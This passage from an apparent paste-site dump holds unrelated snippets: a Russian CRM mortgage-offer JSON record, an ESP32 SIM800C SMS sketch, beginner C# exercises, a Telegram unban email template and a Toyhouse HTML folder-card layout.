         ""72ee10d9-5129-ed11-b823-005056b825cd"",
         ""28396534-5229-ed11-b823-005056b825cd"",
         ""9e42d2df-1ae1-ec11-b823-005056b8a72c"",
         ""b99319fa-4f54-ed11-b823-005056b8a72c"",
         ""bfd4ff44-66ba-ec11-b824-005056b89b68"",
         ""b9b125fc-7e36-ed11-b826-005056b81dee"",
         ""2a7b0a24-9c0d-ed11-b823-005056b8a72c"",
         ""db4e086e-5cc1-ec11-b824-005056b89b68"",
         ""3ee241e9-fe08-ed11-b823-005056b8a72c"",
         ""6daf17a6-fac6-ec11-b822-005056b8a6c4"",
         ""d77ef996-01bf-ec11-b826-005056b81dee"",
         ""d2cedb70-9ab5-ec11-b826-005056b81dee"",
         ""1645d1c1-88da-ec11-b824-005056b89b68"",
         ""129a0f96-1ef9-ec11-b822-005056b8a6c4"",
         ""12250c5e-29f2-ec11-b826-005056b81dee"",
         ""4a109580-48d8-ec11-b823-005056b825cd"",
         ""ba993578-2c29-ed11-b823-005056b825cd"",
         ""5ce2b374-a64b-ed11-b824-005056b89b68"",
         ""011c6846-a74b-ed11-b824-005056b89b68"",
         ""94d00e85-25f2-ec11-b822-005056b8a6d9"",
         ""96dc9140-7bf8-ec11-b822-005056b8a6d9"",
         ""baff778a-2f51-ed11-b826-005056b81dee"",
         ""6c98bd23-eb1e-ed11-b823-005056b825cd"",
         ""d497b677-43ee-ec11-b822-005056b8a6c4"",
         ""2e446f48-210c-ed11-b824-005056b89b68"",
         ""215b2df1-2af9-ec11-b824-005056b89b68"",
         ""235b2df1-2af9-ec11-b824-005056b89b68"",
         ""1d5b2df1-2af9-ec11-b824-005056b89b68"",
         ""195b2df1-2af9-ec11-b824-005056b89b68"",
         ""1f5b2df1-2af9-ec11-b824-005056b89b68"",
         ""155b2df1-2af9-ec11-b824-005056b89b68"",
         ""1b5b2df1-2af9-ec11-b824-005056b89b68"",
         ""175b2df1-2af9-ec11-b824-005056b89b68"",
         ""6e57243d-8d0d-ed11-b826-005056b81dee"",
         ""011ca7fa-ef0c-ed11-b822-005056b8a6d9"",
         ""e00353d1-dfe0-ec11-b823-005056b8a72c"",
         ""2f3672a5-f651-ed11-b822-005056b8a6c4"",
         ""5a434a8b-f837-ed11-b822-005056b8a6c4"",
         ""520dfbaa-6449-ed11-b823-005056b825cd"",
         ""9119df47-0ed8-ec11-b823-005056b825cd"",
         ""d57faf35-7d71-ed11-b824-005056b8a72c"",
         ""703fc8e8-b5e8-ec11-b826-005056b81dee"",
         ""275b2df1-2af9-ec11-b824-005056b89b68"",
         ""7d82a038-aa4b-ed11-b823-005056b8a72c"",
         ""0b6c586a-aa4b-ed11-b823-005056b8a72c"",
         ""315b2df1-2af9-ec11-b824-005056b89b68"",
         ""335b2df1-2af9-ec11-b824-005056b89b68"",
         ""94f9bc8c-a94b-ed11-b823-005056b8a72c"",
         ""599a8501-aa4b-ed11-b823-005056b8a72c"",
         ""2d5b2df1-2af9-ec11-b824-005056b89b68"",
         ""712eec90-a84b-ed11-b823-005056b8a72c"",
         ""2f5b2df1-2af9-ec11-b824-005056b89b68"",
         ""b2f1d31b-a94b-ed11-b823-005056b8a72c"",
         ""295b2df1-2af9-ec11-b824-005056b89b68"",
         ""06abf2d3-a74b-ed11-b823-005056b8a72c"",
         ""2b5b2df1-2af9-ec11-b824-005056b89b68"",
         ""39910551-a84b-ed11-b823-005056b8a72c"",
         ""255b2df1-2af9-ec11-b824-005056b89b68"",
         ""b11671fc-f716-ed11-b826-005056b81dee"",
         ""dabcff26-a4fe-ec11-b822-005056b8a6d9"",
         ""eed0ea09-69c1-ec11-b824-005056b89b68"",
         ""2da79562-b5fe-ec11-b826-005056b81dee"",
         ""a355d7bc-cf1e-ed11-b823-005056b825cd"",
         ""2280ef07-d01e-ed11-b823-005056b825cd"",
         ""b2906638-d01e-ed11-b823-005056b825cd"",
         ""e94be46a-cf1e-ed11-b823-005056b825cd"",
         ""489bcb69-5412-ed11-b822-005056b8a6c4"",
         ""48a4fd3f-983a-ed11-b823-005056b825cd"",
         ""e8e2701a-3fe6-ec11-b822-005056b8a6d9"",
         ""8371a875-3ee6-ec11-b822-005056b8a6d9"",
         ""8a407c11-1730-ed11-b822-005056b8a6c4"",
         ""4be34b5e-3c2d-ed11-b822-005056b8a6c4"",
         ""58a4fd3f-983a-ed11-b823-005056b825cd"",
         ""5aa4fd3f-983a-ed11-b823-005056b825cd"",
         ""d8bacbdf-0704-ed11-b824-005056b89b68"",
         ""a315dc82-c461-ed11-b826-005056b81dee"",
         ""d4a00c53-c365-ed11-b824-005056b8a72c"",
         ""c1cb0f31-1630-ed11-b822-005056b8a6c4"",
         ""c996243a-2f43-ed11-b826-005056b81dee"",
         ""8737663d-3343-ed11-b822-005056b8a6c4"",
         ""62de3013-3f66-ed11-b822-005056b8a6c4"",
         ""c31d05ef-bbdc-ec11-b826-005056b81dee"",
         ""7fb26b9c-98f3-ec11-b823-005056b8a72c"",
         ""15a2ae85-f00b-ed11-b822-005056b8a6d9"",
         ""5830cc8d-c1fe-ec11-b826-005056b81dee"",
         ""48df00ae-2701-ed11-b823-005056b8a72c"",
         ""4aa4fd3f-983a-ed11-b823-005056b825cd"",
         ""87b5e473-d2bb-ec11-b822-005056b8a6c4"",
         ""5b415a9f-d0bb-ec11-b822-005056b8a6c4"",
         ""4ca4fd3f-983a-ed11-b823-005056b825cd"",
         ""4ea4fd3f-983a-ed11-b823-005056b825cd"",
         ""bab2486c-3a43-ed11-b822-005056b8a6c4"",
         ""55d0e830-2a0c-ed11-b822-005056b8a6d9"",
         ""95d995d3-c4d2-ec11-b823-005056b825cd"",
         ""7d5b8590-b02e-ed11-b822-005056b8a6c4"",
         ""fa53b9fe-a3f7-ec11-b822-005056b8a6d9"",
         ""9ca0807c-24bb-ec11-b822-005056b8a6d9"",
         ""156d4144-b1d2-ec11-b823-005056b825cd"",
         ""c804f1c4-72c1-ec11-b824-005056b89b68"",
         ""2ec7dad0-32f9-ec11-b822-005056b8a6c4"",
         ""fbe805c4-43f8-ec11-b823-005056b8a72c"",
         ""14af234e-80c1-ec11-b824-005056b89b68"",
         ""4905d188-7af8-ec11-b822-005056b8a6d9"",
         ""285b090f-fd12-ed11-b822-005056b8a6d9"",
         ""88d00e85-25f2-ec11-b822-005056b8a6d9"",
         ""8ad00e85-25f2-ec11-b822-005056b8a6d9"",
         ""6ca4fd3f-983a-ed11-b823-005056b825cd"",
         ""6ea4fd3f-983a-ed11-b823-005056b825cd"",
         ""dd873d01-a2fb-ec11-b823-005056b825cd"",
         ""68a4fd3f-983a-ed11-b823-005056b825cd"",
         ""6aa4fd3f-983a-ed11-b823-005056b825cd"",
         ""2b7028dd-9f65-ed11-b824-005056b8a72c"",
         ""8cd00e85-25f2-ec11-b822-005056b8a6d9"",
         ""5ca4fd3f-983a-ed11-b823-005056b825cd"",
         ""5ea4fd3f-983a-ed11-b823-005056b825cd"",
         ""8ed00e85-25f2-ec11-b822-005056b8a6d9""
      ]
   }
}"
5QZctTfY,P0_O146538 [Ипотечное предложение 2],kirber,JSON,Monday 28th of August 2023 03:49:11 AM CDT,"{
   ""Source"":""crm"",
   ""Message"":"""",
   ""Id"":""e037e938-f944-ee11-b828-005056b83cbb"",
   ""Type"":""update"",
   ""Time"":""2023-08-27T21:23:29"",
   ""Attributes"":{
      ""createdon"":""2023-08-27T19:46:30"",
      ""smt_addition_realization_termid"":null,
      ""smt_colorcode"":null,
      ""smt_constructor_groupcode"":100000002,
      ""smt_default_optionbit"":false,
      ""smt_description"":""Сниженная ставка на ограниченный срок\n\nПервый взнос — от 15%\nСтавка — 1% на 1 год, далее 8%\nРазмер кредита - до 12 млн.\nСрок — до 30 лет"",
      ""smt_discount_amount"":null,
      ""smt_discount_percent"":-2.8000000000,
      ""smt_discount_typecode"":100000002,
      ""smt_end_date"":null,
      ""smt_group_for_websitecode"":100000002,
      ""smt_initial_fee"":15.0000000000,
      ""smt_interest_rate"":null,
      ""smt_marketing_name"":""Супер платеж на 1 год"",
      ""smt_max_quantity"":null,
      ""smt_mortgage_program_validity"":""30"",
      ""smt_name"":""Алхимово 5 очередь_Супер платеж на 1 год"",
      ""smt_option_classcode"":null,
      ""smt_parent_realization_termid"":{
         ""Id"":""95039b48-f244-ee11-b834-005056b8c05c"",
         ""LogicalName"":""smt_realization_term"",
         ""Name"":""Самолет Ипотека_не отображается в конструкторе""
      },
      ""smt_payment_optioncode"":100000002,
      ""smt_postsale"":null,
      ""smt_realization_term_classifier_smt_isfurnishing"":null,
      ""smt_realization_term_classifierid"":{
         ""Id"":""ef20a54c-8200-ee11-9a2c-005056b84c7c"",
         ""LogicalName"":""smt_realization_term_classifier"",
         ""Name"":""Сайт Ипотека""
      },
      ""smt_realization_termid"":""e037e938-f944-ee11-b828-005056b83cbb"",
      ""smt_realization_termParent_smt_default_optionbit"":false,
      ""smt_realization_termParent_smt_name"":""Самолет Ипотека_не отображается в конструкторе"",
      ""smt_realization_termParent_smt_parent_realization_termid"":{
         ""Id"":""01ca962f-8400-ee11-9a2c-005056b84c7c"",
         ""LogicalName"":""smt_realization_term"",
         ""Name"":""Самолет Ипотека""
      },
      ""smt_realization_termParent_smt_realization_termid"":""95039b48-f244-ee11-b834-005056b8c05c"",
      ""smt_required_optionbit"":false,
      ""smt_room_for_optioncode"":null,
      ""smt_roomcode"":null,
      ""smt_start_date"":""2023-08-27T03:00:00"",
      ""smt_stylecode"":null,
      ""smt_technicsbit"":false,
      ""smt_term_typecode"":100000003,
      ""smt_translate_to_dypricebit"":false,
      ""statecode"":0,
      ""statuscode"":1
   },
   ""LinkEntities"":{
      
   },
   ""ManyMany"":{
      
   }
}"
GcRBWfpS,800C GSM Module 3.3/5V - Compatible,microrobotics,Arduino,Monday 28th of August 2023 03:44:21 AM CDT,"/*
Interfacing the ESP32 with the SIM800C GSM module allows you to communicate over a cellular network. The SIM800C module can be used for sending SMS, making calls, or connecting to the internet. In this sample, I'll demonstrate a simple application that sends an SMS message.

Components:
ESP32 development board
SIM800C GSM module
SIM card with active cellular service
Connections:
Connect the VCC of the SIM800C to a 4.2V power supply (or as recommended by the module you have). Make sure the power supply can provide around 2A current, especially during transmission.
Connect GND of the SIM800C to the GND of the ESP32.
Connect the TX pin of the SIM800C to the RX pin (e.g., GPIO 16) of the ESP32.
Connect the RX pin of the SIM800C to the TX pin (e.g., GPIO 17) of the ESP32.

Software:
Install the required library for handling AT commands:
TinyGSM: https://github.com/vshymanskyy/TinyGSM

Make sure to:

Replace the phone_number with the recipient's phone number.
Adjust the sms_text to your desired message.
If your SIM card has a PIN, use modem.simUnlock(""yourPIN""); to unlock it.
This is a basic example. The SIM800C module supports a wide range of functionalities that can be leveraged using AT commands and the TinyGSM library. Make sure to refer to the documentation for more advanced use cases.
*/

#include <TinyGsmClient.h>
#include <HardwareSerial.h>

#define MODEM_RX     16
#define MODEM_TX     17

// Create an instance of the TinyGSM object
TinyGsm modem(Serial2);

// Phone number and SMS text
const char phone_number[] = ""+1234567890"";  // Replace with your phone number
const char sms_text[] = ""Hello from ESP32 and SIM800C!"";

void setup() {
  Serial.begin(115200);
  delay(10);

  // Start communication with the GSM module
  Serial2.begin(9600, SERIAL_8N1, MODEM_RX, MODEM_TX);
  delay(3000);

  Serial.println(""Initializing modem..."");
  modem.restart();

  String modemInfo = modem.getModemInfo();
  Serial.println(""Modem Info: "" + modemInfo);

  // Unlock your SIM card with a PIN if needed
  // modem.simUnlock(""yourPIN"");

  sendSMS();
}

void sendSMS() {
  Serial.println(""Sending SMS..."");

  // Send the SMS
  bool res = modem.sendSMS(phone_number, sms_text);

  if (res) {
    Serial.println(""SMS sent successfully!"");
  } else {
    Serial.println(""Failed to send SMS."");
  }
}

void loop() {
  // Nothing to do here
}

"
8H1e6A7S,Поликлиника,KpucTaJl,C#,Monday 28th of August 2023 03:24:11 AM CDT,"using System;

namespace CSLight
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int minutesPerPeople = 10;
            Console.WriteLine($""Время приема одного человека у врача равно {minutesPerPeople} минут"");

            Console.Write(""Введите кол-во людей в очереди: "");
            int amountPeople = Convert.ToInt32(Console.ReadLine());

            int minutesAll = minutesPerPeople * amountPeople;

            int hours = minutesAll / 60;
            int minutes = minutesAll % 60;

            string hoursString = hours.ToString();
            char penultimateChar = hoursString.Length >= 2 ? hoursString[hoursString.Length - 2] : '0';
            char lastChar = hoursString[hoursString.Length - 1];
            string hoursText = penultimateChar == '1' ? ""часов"" : lastChar == '1' ? ""час"" : lastChar == '2' || lastChar == '3' || lastChar == '4' ? ""часа"" : ""часов"";

            Console.WriteLine($""Время ожидания в очереди: {hours} {hoursText} и {minutes} минут"");
            Console.ReadKey();
        }
    }
}"
GMMRJysQ,Untitled,iioun,Lua,Monday 28th of August 2023 03:21:44 AM CDT,"_G.Key = ""yS5wB2YDB8btfFAU9"""
ECPCqgrH,book_dialog,FreedTV,JSON,Monday 28th of August 2023 03:20:01 AM CDT,"{
    ""data"":[
        {
            ""name"":""name"",
            ""pic"":""pic"",
            ""show"":false,
            ""oneTime"":true,
            ""type"":""type"",
            ""url"":""url""
        }
    ]
}"
SwXHZUaW,Магазин кристаллов,KpucTaJl,C#,Monday 28th of August 2023 03:07:51 AM CDT,"using System;

namespace CSLight
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int costCrystal = 7;
            Console.WriteLine($""Цена одного кристалла равна {costCrystal}"");

            Console.Write(""Введите ваше кол-во золота: "");
            int amountGold = Convert.ToInt32(Console.ReadLine());

            Console.Write(""Введите кол-во кристаллов, которое вы хотите купить: "");
            int amountCrystal = Convert.ToInt32(Console.ReadLine());

            int amountRequired = amountCrystal * costCrystal;

            if (amountRequired > amountGold)
            {
                int amountMissing = amountRequired - amountGold;
                Console.WriteLine($""Вы не можете купить данное кол-во кристаллов ({amountCrystal} шт.), вам не хватает {amountMissing} золота"");
            }
            else
            {
                amountGold -= amountRequired;
                Console.WriteLine($""Вы купили кристаллы в количестве {amountCrystal} шт., у вас осталось {amountGold} золота"");
            }

            Console.ReadKey();
        }
    }
}"
JmrfFbUx,Перестановка местами значений,KpucTaJl,C#,Monday 28th of August 2023 02:50:22 AM CDT,"using System;

namespace CSLight
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string firstVariable = ""Вячеслав"";
            string secondVariable = ""Бугаев"";

            Console.WriteLine(""До перестановки:"");
            Console.WriteLine($""Значение первой переменной: {firstVariable}"");
            Console.WriteLine($""Значение второй переменной: {secondVariable}"");

            (firstVariable, secondVariable) = (secondVariable, firstVariable);

            Console.WriteLine(""\nПосле перестановки:"");
            Console.WriteLine($""Значение первой переменной: {firstVariable}"");
            Console.WriteLine($""Значение второй переменной: {secondVariable}"");
            Console.ReadKey();
        }
    }
}"
pupkr81c,Fuckbook TV - Scam - Spam [8/2023],bombaires,HTML,Monday 28th of August 2023 02:46:13 AM CDT,"<a href=""mailto:info@mail-leads.ink"">info@mail-leads.ink</a>
<a href=""mailto:e1e591c5fea1afedb2fbd0bf8ca32220-4873438@contact.gandi.net"">e1e591c5fea1afedb2fbd0bf8ca32220-4873438@contact.gandi.net</a>
<a href=""mailto:18d255df2aedd8b2f03ee5679a7751cf-4873432@contact.gandi.net"">18d255df2aedd8b2f03ee5679a7751cf-4873432@contact.gandi.net</a>
<a href=""mailto:support@fuckbook.tv"">support@fuckbook.tv</a>
"
QT131JmT,Картинки,KpucTaJl,C#,Monday 28th of August 2023 02:27:31 AM CDT,"using System;

namespace CSLight
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.Write(""Введите кол-во картинок в одном ряду: "");
            int countInRow = Convert.ToInt32(Console.ReadLine());

            Console.Write(""Введите общее кол-во картинок: "");
            int countAll = Convert.ToInt32(Console.ReadLine());

            int countRow = countAll / countInRow;
            int remainderOfDivision = countAll % countInRow;

            Console.WriteLine($""Кол-во полностью заполненных рядов: {countRow}\nКол-во оставшихся картинок в последнем ряду: {remainderOfDivision}"");
            Console.ReadKey();
        }
    }
}
"
C2V4CQSn,Работа со строками,KpucTaJl,C#,Monday 28th of August 2023 02:07:38 AM CDT,"using System;
using System.Text;

namespace CSLight
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.InputEncoding = Encoding.Unicode;
            Console.OutputEncoding = Encoding.Unicode;

            Console.Write(""Ваше имя: "");
            string name = Console.ReadLine();

            Console.Write(""Ваш возраст: "");
            int age = Convert.ToInt32(Console.ReadLine());

            string ageString = age.ToString();
            char penultimateChar = ageString.Length >= 2 ? ageString[ageString.Length - 2] : '0';
            char lastChar = ageString[ageString.Length - 1];
            string ageText = penultimateChar == '1' ? ""лет"" : lastChar == '1' ? ""год"" : lastChar == '2' || lastChar == '3' || lastChar == '4' ? ""года"" : ""лет"";

            Console.Write(""Ваш знак зодиака: "");
            string zodiacSign = Console.ReadLine();

            Console.Write(""Ваше место работы: "");
            string placeWork = Console.ReadLine();

            Console.WriteLine($""\nВаше имя - {name}, вам {age} {ageText}, вы {zodiacSign} и ваше место работы / рабочий статус - {placeWork}"");
            Console.ReadKey();
        }
    }
}"
MfsNg5Wi,Formal email to get back banned telegram account,Snehashish,Python,Monday 28th of August 2023 01:49:22 AM CDT,"""""""
Dear Telegram Support Team,

I hope this email finds you well. 
I am writing to bring to your attention an issue I am currently facing with my Telegram account.

Firstly, I would like to express my gratitude for the amazing platform that Telegram provides. 
I have been a loyal user for several years now and have always appreciated the seamless communication experience it offers.

I understand that Telegram has implemented strict measures to combat spam and ensure a safe environment for its users. 
However, I would like to emphasize that I have never engaged in any spamming activities or violated any of Telegram's terms and conditions. 
This ban seems to be a result of an erroneous detection or misunderstanding.

However, I believe that my account has been mistakenly flagged and was banned as a result of an error in your system.


I kindly request your assistance in reviewing my case and reinstating my account as soon as possible. 
Losing access to my Telegram account has caused a significant disruption in my daily communication and has affected my ability to stay connected with friends, family, and colleagues.

I am providing some details related to my account for your reference.
    > Username: - 
    > User id:
    > Phone number: +91

Some additional details about my last time telegram account activity which might have caused this:
....

I am attaching an screenshot showing what was the exact message I tried to send.
If there is any additional information or steps I need to take to prove my innocence and regain access to my account, please let me know. 
I am more than willing to cooperate and provide any further details that may be required.

I remain optimistic that this matter will be resolved promptly, and I can regain access to my account. 
I have complete faith in the professionalism and expertise of the Telegram Support Team, and I am confident that you will thoroughly investigate this issue and rectify it accordingly.

Thank you for your attention to this matter, and I look forward to hearing from you soon.

Best regards,
Name
"""""""
v3p4v7A4,wip directory,vermilly,HTML,Monday 28th of August 2023 01:31:00 AM CDT,"<!-- 21 || FOLDER CARDS by icecreampizzeria (BOOTSTRAP)
    CUSTOM COLORS VER can be found here: https://pastebin.com/z8YncUR8
    
    find (ctrl + f) URLHERE for links, IMGHERE for image addresses. To change icons, visit https://fontawesome.com !
    
    the cards will automatically be centered if they're less than three in a row. 
    
    to add more folder cards, copy from where it says FOLDER CARD to END FOLDER CARD, then paste it anywhere above the line that's indicated for you.
    
    you can do whatever with the badges! it doesn't have to be the rating or the warning, those are just suggestions. You're free to delete any of the parts to your liking. It's best if you keep all the lines of the cards filled equally so they look uniform, but that's your choice too :3c
    
-->
 
<!-- //////////////////// WHOLE THING //////////////////// -->
<div class=""container p-0 text-center"">
    <div class=""row no-gutters justify-content-center"">
     
        <!-- //////////////////// NOTCE CARD //////////////////// -->
        <div class=""col-lg-12 d-flex"">
            <div class=""m-2 card bg-faded text-center p-0 flex-fill"">
                
                <!-- //////////////////// FOLDER NAME - change 'fa-star' into any of the icons available on https://fontawesome.com/  //////////////////// -->

                
                <!-- //////////////////// GENRE / SUBTITLE //////////////////// -->
                <i class=""mx-3"" style=""font-size: 1rem;"">WELCOME TO MY HUMBLE ABODE!</i>
                <i class=""mb-1 mx-3"" style=""font-size: 0.8rem;"">last directory update: aug. 28 2023</i>
                <p class=""mb-2 mx-3"" style=""font-size: 0.8rem;"">also, gift art is OK for any characters (both on this account & side account)! just keep it pg-13!</p>
<p class=""mb-2 mx-3"" style=""font-size: 0.8rem;"">if you see this wip folder, no u dont. look away. shoo</p>

            </div>
        </div>
        <!-- //////////////////// NOTCE FOLDER CARD //////////////////// -->     
   
   <!-- //////////////////// FOLDER CARD //////////////////// -->
        <div class=""col-lg-3 d-flex"">
            <div class=""m-2 card bg-faded text-center p-0 flex-fill"">
            
                <!-- //////////////////// IMAGE - if you need to adjust the crop, change 'center' to top/bottom/center , left/right/center (ex. top left) //////////////////// -->
                <div class=""card p-1 m-2"">
                    <div style=""
                    background: url(https://f2.toyhou.se/file/f2-toyhou-se/images/66767241_DeR0mp5t0ij0g2h.png?1692081459)
                        center no-repeat;
                    background-size: cover;
                    min-height: 100px;""></div>
                </div>
                
                <!-- //////////////////// FOLDER NAME - change 'fa-star' into any of the icons available on https://fontawesome.com/  //////////////////// -->
                <p class=""mb-1 mx-2"" style=""font-size: 1rem;"">
                    NORMAL CHARACTERS
                </p>
                
                <!-- //////////////////// GENRE / SUBTITLE //////////////////// -->
                <i class=""mb-2"" style=""font-size: 0.8rem;"">GENRE / SUBTITLE</i>
                <p class=""mb-2 mx-3"" style=""font-size: 0.8rem;"">Characters that belong in their own world, or some other miscellaneous world!</p>

              
                <!-- //////////////////// BADGES  //////////////////// -->
                <div class=""mb-2 mx-2 row justify-content-center"">
                    <span class=""badge badge-pill bg-danger m-1"">7/8 REFERENCES COMPLETE</span>
                    <span class=""badge badge-pill bg-warning m-1"">8/8 BIOS COMPLETE</span>
                    <span class=""badge badge-pill bg-success m-1"">WARNING</span>
                    <span class=""badge badge-pill bg-primary m-1""> <i class=""fas fa-star fa-sm""></i> SONA IN HERE!</span>
                </div>
                <!-- //////////////////// END BADGES //////////////////// -->
                
                <!-- //////////////////// FOLDER LINK - replace URLHERE with your folder link! //////////////////// -->
                <a href=""URLHERE"" class=""h-100 w-100 stretched-link btn btn-outline-secondary border-0"" style=""position: absolute; mix-blend-mode: overlay;""></a>
                
            </div>
        </div>
        <!-- //////////////////// END FOLDER CARD //////////////////// -->
        
   
   
        <!-- //////////////////// FOLDER CARD //////////////////// -->
        <div class=""col-lg-3 d-flex"">
            <div class=""m-2 card bg-faded text-center p-0 flex-fill"">
            
                <!-- //////////////////// IMAGE - if you need to adjust the crop, change 'center' to top/bottom/center , left/right/center (ex. top left) //////////////////// -->
                <div class=""card p-1 m-2"">
                    <div style=""
                    background: url(https://f2.toyhou.se/file/f2-toyhou-se/images/59348069_6AUr9SVjQ2OVvTZ.png)
                        center no-repeat;
                    background-size: cover;
                    min-height: 100px;""></div>
                </div>
                
                <!-- //////////////////// FOLDER NAME - change 'fa-star' into any of the icons available on https://fontawesome.com/  //////////////////// -->
                <p class=""mb-1 mx-2"" style=""font-size: 1rem;"">
                    STAINED FEATHERS
                </p>
                
                <!-- //////////////////// GENRE / SUBTITLE //////////////////// -->
                <i class=""mb-2 mx-3"" style=""font-size: 0.8rem;"">GENRE / SUB</i>
                <p class=""mb-2 mx-3"" style=""font-size: 0.8rem;"">ok bbg lets see how this looks</p>

                
                <!-- //////////////////// BADGES //////////////////// -->
                <div class=""mb-2 mx-2 row justify-content-center"">
                    <span class=""badge badge-pill bg-danger m-1"">6/7 REFERENCES COMPLETE</span>
                    <span class=""badge badge-pill bg-danger m-1"">1/7 BIOS COMPLETE</span>

                </div>
                <!-- //////////////////// END BADGES //////////////////// -->
                
                <!-- /////////// FOLDER LINK - replace URLHERE with your folder link! ///////// -->
                <a href=""URLHERE"" class=""h-100 w-100 stretched-link btn btn-outline-secondary border-0"" style=""position: absolute; mix-blend-mode: overlay;""></a>
                
            </div>
        </div>
        <!-- //////////////////// END FOLDER CARD //////////////////// -->
        
    
          <!-- //////////////////// FOLDER CARD //////////////////// -->
        <div class=""col-lg-3 d-flex"">
            <div class=""m-2 card bg-faded text-center p-0 flex-fill"">
            
                <!-- //////////////////// IMAGE - if you need to adjust the crop, change 'center' to top/bottom/center , left/right/center (ex. top left) //////////////////// -->
                <div class=""card p-1 m-2"">
                    <div style=""
                    background: url(https://f2.toyhou.se/file/f2-toyhou-se/images/32686246_VdtXSST51ycszYz.png)
                        center no-repeat;
                    background-size: cover;
                    min-height: 100px;""></div>
                </div>
                
                <!-- //////////////////// FOLDER NAME - change 'fa-star' into any of the icons available on https://fontawesome.com/  //////////////////// -->
                <p class=""mb-1 mx-2"" style=""font-size: 1rem;"">
                    FIRE CHARADE
                </p>
                
                <!-- //////////////////// GENRE / SUBTITLE //////////////////// -->
                <i class=""mb-2"" style=""font-size: 0.8rem;"">GENRE / SUBTITLE</i>
                <p class=""mb-2 mx-3"" style=""font-size: 0.8rem;"">help girl i have sm for this umm</p>

                
                <!-- //////////////////// BADGES  //////////////////// -->
                <div class=""mb-2 mx-2 row justify-content-center"">
                    <span class=""badge badge-pill bg-danger m-1"">0/8 REFERENCES COMPLETE</span>
                    <span class=""badge badge-pill bg-danger m-1"">0/8 BIOS COMPLETE</span>
                    <span class=""badge badge-pill bg-success m-1"">WARNING</span>
                    <span class=""badge badge-pill bg-primary m-1"">WARNING</span>
                </div>
                <!-- //////////////////// END BADGES //////////////////// -->
                
                <!-- //////////////////// FOLDER LINK - replace URLHERE with your folder link! //////////////////// -->
                <a href=""URLHERE"" class=""h-100 w-100 stretched-link btn btn-outline-secondary border-0"" style=""position: absolute; mix-blend-mode: overlay;""></a>
                
            </div>
        </div>
        <!-- //////////////////// END FOLDER CARD //////////////////// -->
        
  <!-- //////////////////// FOLDER CARD //////////////////// -->
        <div class=""col-lg-3 d-flex"">
            <div class=""m-2 card bg-faded text-center p-0 flex-fill"">
            
                <!-- //////////////////// IMAGE - if you need to adjust the crop, change 'center' to top/bottom/center , left/right/center (ex. top left) //////////////////// -->
                <div class=""card p-1 m-2"">
                    <div style=""
                    background: url(https://f2.toyhou.se/file/f2-toyhou-se/images/55004603_VZb4xPfgezH3zzX.png)
                        center no-repeat;
                    background-size: cover;
                    min-height: 100px;""></div>
                </div>
                
                <!-- //////////////////// FOLDER NAME - change 'fa-star' into any of the icons available on https://fontawesome.com/  //////////////////// -->
                <p class=""mb-1 mx-2"" style=""font-size: 1rem;"">
                    ARTHERIUM
                </p>
                
                <!-- //////////////////// GENRE / SUBTITLE //////////////////// -->
                <i class=""mb-2"" style=""font-size: 0.8rem;"">GENRE / SUBTITLE</i>
                 <p class=""mb-2 mx-3"" style=""font-size: 0.8rem;"">Characters that live in the <a href=""https://toyhou.se/~world/80601.artherium"">Artherium</a> world!</p>

                
                <!-- //////////////////// BADGES  //////////////////// -->
                <div class=""mb-2 mx-2 row justify-content-center"">
                    <span class=""badge badge-pill bg-danger m-1"">2/6 REFERENCES COMPLETE</span>
                    <span class=""badge badge-pill bg-warning m-1"">6/6 BIOS COMPLETE</span>
                    <span class=""badge badge-pill bg-success m-1"">WARNING</span>
                    <span class=""badge badge-pill bg-primary m-1""> <i class=""fas fa-star fa-sm""></i> SONA IN HERE!</span>
                </div>
                <!-- //////////////////// END BADGES //////////////////// -->
                
                <!-- //////////////////// FOLDER LINK - replace URLHERE with your folder link! //////////////////// -->
                <a href=""URLHERE"" class=""h-100 w-100 stretched-link btn btn-outline-secondary border-0"" style=""position: absolute; mix-blend-mode: overlay;""></a>
                
            </div>
        </div>
        <!-- //////////////////// END FOLDER CARD //////////////////// -->
               
          
        <!-- //////////////////// FOLDER CARD //////////////////// -->
        <div class=""col-lg-3 d-flex"">
            <div class=""m-2 card bg-faded text-center p-0 flex-fill"">
            
                <!-- //////////////////// IMAGE - if you need to adjust the crop, change 'center' to top/bottom/center , left/right/center (ex. top left) //////////////////// -->
                <div class=""card p-1 m-2"">
                    <div style=""
                    background: url(IMGHERE)
                        center no-repeat;
                    background-size: cover;
                    min-height: 100px;""></div>
                </div>
                
                <!-- //////////////////// FOLDER NAME - change 'fa-star' into any of the icons available on https://fontawesome.com/  //////////////////// -->
                <p class=""mb-1 mx-2"" style=""font-size: 1rem;"">
                    OTA
                </p>
                
                <!-- //////////////////// GENRE / SUBTITLE //////////////////// -->
                <i class=""mb-2"" style=""font-size: 0.8rem;"">GENRE / SUBTITLE</i>
                
                <!-- //////////////////// BADGES
                    - more bootstrap bg colors can be found here: https://getbootstrap.com/docs/4.0/utilities/colors/#background-color
                    - replace bg-primary with bg-warning, bg-success, etc.
                    - there's one line for every badge. Feel free to add/remove by copy pasting/deleting a line! //////////////////// -->
                <div class=""mb-2 mx-2 row justify-content-center"">
                    <span class=""badge badge-pill bg-warning m-1"">STORY RATING</span>
                    <span class=""badge badge-pill bg-danger m-1"">WARNING</span>
                </div>
                <!-- //////////////////// END BADGES //////////////////// -->
                
                <!-- //////////////////// FOLDER LINK - replace URLHERE with your folder link! //////////////////// -->
                <a href=""URLHERE"" class=""h-100 w-100 stretched-link btn btn-outline-secondary border-0"" style=""position: absolute; mix-blend-mode: overlay;""></a>
                
            </div>
        </div>
        <!-- //////////////////// END FOLDER CARD //////////////////// -->
        
        
        
        <!-- //////////////////// add more folder cards ABOVE this line! //////////////////// -->
    </div>
    
    <!-- //////////////////// CREDITS - feel free to move it but please don't remove it! <3 //////////////////// -->
    <a href=""https://toyhou.se/icecreampizzeria"" data-toggle=""tooltip""  data-placement=""bottom""  title=""code by icecreampizzeria""><i class=""fas fa-code""></i></a>
</div>
<!-- //////////////////// END WHOLE THING //////////////////// -->"
WArEprV6,Переменные,KpucTaJl,C#,Monday 28th of August 2023 01:24:05 AM CDT,"namespace CSLight
{
    internal class Program
    {
        static void Main(string[] args)
        {
            byte firstVariable = 1;
            short secondVariable = 2;
            int thirdVariable = 3;
            long fourthVariable = 4;
            float fifthVariable = 5.0f;
            double sixthVariable = 6.0;
            char seventhVariable = '7';
            string eighthVariable = ""8"";
            ulong ninthVariable = 9;
            bool tenthVariable = true;
        }
    }
}"
